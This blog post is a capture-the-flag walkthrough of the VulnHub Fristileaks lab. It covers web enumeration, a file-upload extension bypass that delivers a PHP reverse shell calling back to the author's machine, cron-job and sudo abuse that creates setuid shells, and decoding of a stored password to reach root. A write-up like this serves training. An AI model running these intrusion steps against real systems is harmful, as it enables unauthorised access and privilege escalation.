---
layout: post
title: "Fristileaks Hacking Challenge"
date: 2015-12-15 00:57:23 -0500
comments: true
categories: boot2root
---

Fristileaks is the latest addition to [VulnHub's](https://www.vulnhub.com/entry/fristileaks-13,133/) list of ever growing boot2roots. It's authored by Ar0xA, and the goal is to get root and read the flag. As far as difficulty, I found it to be relatively easy making it great for those who are just starting out with hacking. 

The initial portscan revealed only port 80 to be open. I pointed my browser over to the target and was greeted with a lovely banner: 

![](/images/2015-12-15/01.png)

So many names listed at the bottom of the webpage. Potential user accounts on the server perhaps? I copied them over to a file just in case I needed it later. I ran Nikto against the webserver to see if I could get any clues on how to proceed: 

```
# nikto -host http://192.168.119.152
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.119.152
+ Target Hostname:    192.168.119.152
+ Target Port:        80
+ Start Time:         2015-12-15 20:10:30 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server leaks inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8348 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2015-12-15 20:10:55 (GMT-5) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The sites in robots.txt were all red herrings. The images directory contained a couple of images, both of which yielded nothing of interest. A directory crawl on the site returned no results either. After twiddling my thumbs for a couple of minutes, it occured to me that perhaps I needed to create my own wordlist out of text from the website itself. Here's what I came up with:

```
# cat list.txt 
meneer
barrebas
rikvduijn
wez3forsec
PyroBatNL
0xDUDE
annejanbrouwer
Sander2121
Reinierk
DearCharles
miamat
MisterXE
BasB
Dwight
Egeltje
pdersjant
tcp130x10
spierenburg
ielmatani
renepieters
Mystery guest
EQ_uinix
WhatSecurity
mramsmeets
Ar0xA
keep
calm
and
drink
fristi
Fristileaks
2015-12-11
are
The
motto
``` 

I passed that over to dirb to see if it would fine anything:

```
# dirb http://192.168.119.152 list.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 14 20:20:22 2015
URL_BASE: http://192.168.119.152/
WORDLIST_FILES: list.txt

-----------------

GENERATED WORDS: 35                                                            

---- Scanning URL: http://192.168.119.152/ ----
==> DIRECTORY: http://192.168.119.152/fristi/                                                                          
                                                                                                                       
---- Entering directory: http://192.168.119.152/fristi/ ----
                                                                                                                       
-----------------
END_TIME: Mon Dec 14 20:20:22 2015
DOWNLOADED: 70 - FOUND: 0
```

Sweet, I got a hit with "fristi". Heading over to http://192.168.119.152/fristi/ returned a login form:


![](/images/2015-12-15/02.png)

Taking a look at the source code revealed some interesting tidbits. First, there was a comment made by the user eezeepz.

```
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

Second, there was a chunk of what appeared to be Base64 encoded data.

```
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

This actually decoded into a PNG file. 

```
# base64 -d wut.txt | xxd -g1 | head
0000000: 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52  .PNG........IHDR
0000010: 00 00 01 6d 00 00 00 4b 08 02 00 00 00 34 e1 41  ...m...K.....4.A
0000020: ea 00 00 00 01 73 52 47 42 00 ae ce 1c e9 00 00  .....sRGB.......
0000030: 00 04 67 41 4d 41 00 00 b1 8f 0b fc 61 05 00 00  ..gAMA......a...
0000040: 00 09 70 48 59 73 00 00 0e c3 00 00 0e c3 01 c7  ..pHYs..........
0000050: 6f a8 64 00 00 04 52 49 44 41 54 78 5e ed d9 51  o.d...RIDATx^..Q
0000060: 76 db 20 10 85 61 af cb 0b f2 7a b2 9a 6c 26 8b  v. ..a....z..l&.
0000070: 49 25 4b 48 80 40 66 34 35 bd 35 ff f7 56 49 0c  I%KH.@f45.5..VI.
0000080: 93 81 dc 73 da de 7e 01 c0 87 1c 01 e0 45 8e 00  ...s..~......E..
0000090: f0 22 47 00 78 91 23 00 bc c8 11 00 5e e4 08 00  ."G.x.#.....^...
```

With that in mind, I saved it into its own file and opened it. 


![](/images/2015-12-15/03.png)

As it turns out, it was eezeepz's password for the login form. Punching the credentials in displayed a webpage that would upload a file to the server: 


![](/images/2015-12-15/04.png)

The upload form would only accept png, jpg, and gif files. However, the upload script didn't actually check the file type; only the extension. That meant it would be easy enough to bypass by simply adding that extension to whatever file I wanted to upload. 

Uploaded files are stored in http://192.168.119.152/fristi/uploads/. My first thought was to upload a PHP reverse shell so I could get a foothold on the server. Kali has a /usr/share/webshells/php/php-reverse-shell.php that I like to use. I modified it to point to my machine's IP address and port, and renamed it to shell.php.png. 

The .png extension allowed me to upload it, and accessing it via curl triggered the PHP webshell and gave me a reverse shell as the apache user: 


![](/images/2015-12-15/05.png)

I had a quick peek at /home and found three home directories:

```
sh-4.1$ ls -l /home/
ls -l /home/
total 20
drwx------. 2 admin     admin      4096 Nov 19 02:03 admin
drwx---r-x. 5 eezeepz   eezeepz   12288 Nov 18 15:35 eezeepz
drwx------  2 fristigod fristigod  4096 Nov 19 01:40 fristigod
```

eezeepz was the only one accessible to me at this time, so I had a poke around there. A notes.txt in that directory revealed some clues on what to do next: 

```
sh-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

So I just had to create a file called /tmp/runthis with some commands that I wanted executed as the admin user. Seemed pretty straightforward to get a shell as the admin user from here: 

```
sh-4.1$ echo '/home/admin/cat /bin/dash > /tmp/adminshell' > /tmp/runthis
echo '/home/admin/cat /bin/dash > /tmp/adminshell' > /tmp/runthis
sh-4.1$ echo '/home/admin/chmod 4755 /tmp/adminshell' >> /tmp/runthis
echo '/home/admin/chmod 4755 /tmp/adminshell' >> /tmp/runthis
sh-4.1$ cat /tmp/runthis
cat /tmp/runthis
/home/admin/cat /bin/dash > /tmp/adminshell
/home/admin/chmod 4755 /tmp/adminshell
```

After waiting a minute, /tmp/adminshell had been created. I executed it and was elevated to the admin user: 

```
sh-4.1$ ls -l /tmp/adminshell
ls -l /tmp/adminshell
-rwsr-xr-x 1 admin admin 106216 Dec 14 16:04 /tmp/adminshell
sh-4.1$ /tmp/adminshell
/tmp/adminshell
whoami
admin
```

Looking at admin's home directory showed a couple of interesting files; namely cryptedpass.txt, cryptpass.py, and whoisyourgodnow.txt. cryptpass.py takes a string, Base64 encodes it, encodes it with ROT13, and then reverses it:

```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

I played around with it and noticed that the output it generated looked very similar to the one in whoisyourgodnow.txt. So I updated the script to include a function that would decode the encoded string: 

```python
#!/usr/bin/env python
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

def decodeString(str):
    s = str[::-1]
    s = s.encode("rot13")
    return base64.b64decode(s)

print decodeString("=RFn0AKnlMHMPIzpyuTI0ITG")
```

I ran it, and it returned:

```
# ./decode.py 
LetThereBeFristi!
``` 

So what was this? Since the whoisyourgodnow.txt file was owned by user fristigod, my first assumption was that this was his password. Easiest way to test was to just try su to user fristigod. For that, I needed a TTY which I could get with Python:

```
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ su - fristigod
su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ whoami
whoami
fristigod
```

Great, one step closer to root! fristigod's home directory contained a file called doCom located in /var/fristigod/.secret\_admin\_stuff:

```
-bash-4.1$ ./doCom
./doCom
Nice try, but wrong user ;)
```

I checked to see if fristigod had sudo rights, and he did:

```
-bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

So user fristi could run the doCom command:

```
-bash-4.1$ sudo -u fristi ./doCom 
sudo -u fristi ./doCom
Usage: ./program_name terminal_command ...-bash-4.1$
```

Different output, so I was definitely getting somewhere! According to the usage, it takes a command, so I passed one in to see what would happen: 

```
-bash-4.1$ sudo -u fristi ./doCom id
sudo -u fristi ./doCom id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```

Great, basically any command passed to doCom was executed as root. It was time to get a root shell: 

```
-bash-4.1$ sudo -u fristi ./doCom cp /bin/dash /tmp/rootshell
sudo -u fristi ./doCom cp /bin/dash /tmp/rootshell
-bash-4.1$ sudo -u fristi ./doCom chmod 4755 /tmp/rootshell
sudo -u fristi ./doCom chmod 4755 /tmp/rootshell
-bash-4.1$ /tmp/rootshell
/tmp/rootshell
# whoami
whoami
root
```

Woo hoo! Root shell! All that was left was to pillage /root and grab that flag: 

```
# ls -l /root
ls -l /root
total 4
-rw-------. 1 root root 246 Nov 17 12:19 fristileaks_secrets.txt
# cat /root/fristileaks_secrets.txt
cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

And that, as they say, is that! 
